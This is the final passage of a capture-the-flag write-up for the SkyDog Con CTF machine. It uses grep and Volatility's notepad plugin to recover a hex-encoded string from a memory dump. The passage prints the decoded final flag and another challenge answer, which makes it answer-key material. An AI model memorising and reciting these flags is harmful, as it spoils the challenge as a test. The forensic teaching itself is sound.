<p>I searched for the string code in the resulting list of files and got a hit:</p>

<p><code>
grep "code" filelist.txt
0x0000000005e612f8      1      0 -W-r-- \Device\HarddiskVolume1\Documents and Settings\test\Desktop\code.txt
0x00000000062e04b0      1      0 R--r-d \Device\HarddiskVolume1\Documents and Settings\test\Recent\code.txt.lnk
0x00000000064900a0      1      0 R--rwd \Device\HarddiskVolume1\WINDOWS\system32\unicode.nls
0x0000000006640bc8      1      0 R--rwd \Device\HarddiskVolume1\Documents and Settings\test\Desktop\code.txt
</code></p>

<p>Maybe this code.txt file is connected to the running Notepad process. I used Volatility&rsquo;s notepad plugin to dump the text found into Notepad:</p>

<h2>``` </h2>

<h2>Module Notepad</h2>

<p>List currently displayed notepad text</p>

<p>volatility notepad -f data
Volatility Foundation Volatility Framework 2.6
Process: 268
Text:
?</p>

<p>Text:
d</p>

<p>Text:</p>

<p>Text:
?</p>

<p>Text:
66 6c 61 67 7b 38 34 31 64 64 33 64 62 32 39 62 30 66 62 62 64 38 39 63 37 62 35 62 65 37 36 38 63 64 63 38 31 7d
```</p>

<p>We have a hex string! Decoding it yields the final flag: <code>flag{841dd3db29b0fbbd89c7b5be768cdc81}</code>. And the decoded value for the last flag is <code>Two[space]little[space]mice</code></p>

<p>This is it for the SkyDog Con CTF machine! I particularly liked the memory forensics part at the end!</p>

<p>```</p>

<hr />

<p>/ Q: Do you know what the death rate \
\ around here is? A: One per person. /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
</feed>
